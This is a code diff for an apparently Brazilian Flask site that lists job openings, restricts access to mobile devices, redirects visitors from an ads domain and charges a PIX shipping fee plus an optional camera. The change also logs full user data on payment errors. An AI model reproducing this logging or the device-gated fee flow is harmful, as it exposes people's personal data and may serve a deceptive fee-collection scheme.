@@ -15,7 +15,6 @@ from cache_manager import page_cache, api_cache
 from performance_optimizer import performance_optimizer, performance_monitor
 from heroku_optimizer import heroku_optimizer
 from simple_mobile_protection import simple_mobile_only
-from mobile_protection import mobile_only
 from meta_pixels import MetaPixelTracker
 
 # Initialize Meta Pixel tracker
@@ -76,13 +75,13 @@ def serve_font(filename):
     return send_from_directory('static/fonts', filename)
 
 @app.route("/")
-@mobile_only
+@simple_mobile_only
 @performance_monitor
 def index():
     return render_template("index.html")
 
 @app.route("/vagas")
-@mobile_only
+@simple_mobile_only
 @performance_monitor
 def vagas():
     """Vagas page with domain redirection from ads domain to main domain"""
@@ -385,7 +384,6 @@ def get_user_data():
     })
 
 @app.route("/address", methods=['GET', 'POST'])
-@mobile_only
 def address():
     if request.method == 'POST':
         try:
@@ -434,7 +432,7 @@ def create_shipping_payment():
         payment_api = create_payment_api()
         
         # Calculate total amount based on camera offer
-        base_amount = 27.30  # Base shipping fee
+        base_amount = 18.30  # Base shipping fee
         camera_price = float(data.get('camera_price', 0))
         total_amount = base_amount + camera_price
         
@@ -653,7 +651,12 @@ def create_pix_payment():
         camera_amount = 79.90  # Valor da câmera
         total_amount = base_amount + camera_amount if camera_offer else base_amount
         
-        app.logger.info(f"Câmera selecionada: {camera_offer}, Valor total: R$ {total_amount:.2f}")
+        app.logger.info(f"=== DADOS PAGAMENTO ===")
+        app.logger.info(f"Câmera selecionada: {camera_offer}")
+        app.logger.info(f"Valor base: R$ {base_amount:.2f}")
+        app.logger.info(f"Valor câmera: R$ {camera_amount:.2f}")
+        app.logger.info(f"Valor total: R$ {total_amount:.2f}")
+        app.logger.info(f"=======================")
         
         payment_data = {
             'name': user_data.get('name'),  # OBRIGATÓRIO do index
@@ -691,27 +694,9 @@ def create_pix_payment():
             return redirect(url_for('pagamento'))
         
     except Exception as e:
-        app.logger.error(f"Error creating payment: {str(e)}")
-        # Create a mock payment for testing when API fails
-        mock_payment = {
-            'id': f'test_payment_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
-            'pixCode': '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654047340540302BR59João Silva6009São Paulo62070503***630445D8',
-            'amount': 84.90,
-            'status': 'pending'
-        }
-        session['payment_data'] = mock_payment
-        
-        # Track the mock sale
-        try:
-            db_analytics.track_sale('João Silva', 84.90, '12345678901', mock_payment['id'])
-            analytics_tracker.track_sale('João Silva', 84.90)
-        except Exception:
-            pass
-            
-        if request.method == 'POST':
-            return jsonify({'success': False, 'error': str(e), 'payment_id': mock_payment['id']})
-        else:
-            return redirect(url_for('pagamento'))
+        app.logger.error(f"Error creating shipping payment: {str(e)}")
+        app.logger.error(f"User data received: {user_data}")
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route("/pix_confirmado")
 def pix_confirmado():
@@ -724,7 +709,6 @@ def redirect_payment():
     return render_template("payment_redirect.html")
 
 @app.route("/pagamento")
-@mobile_only
 def pagamento():
     # Get payment data from session (created by create-shipping-payment route)
     payment_data = session.get('payment_data')
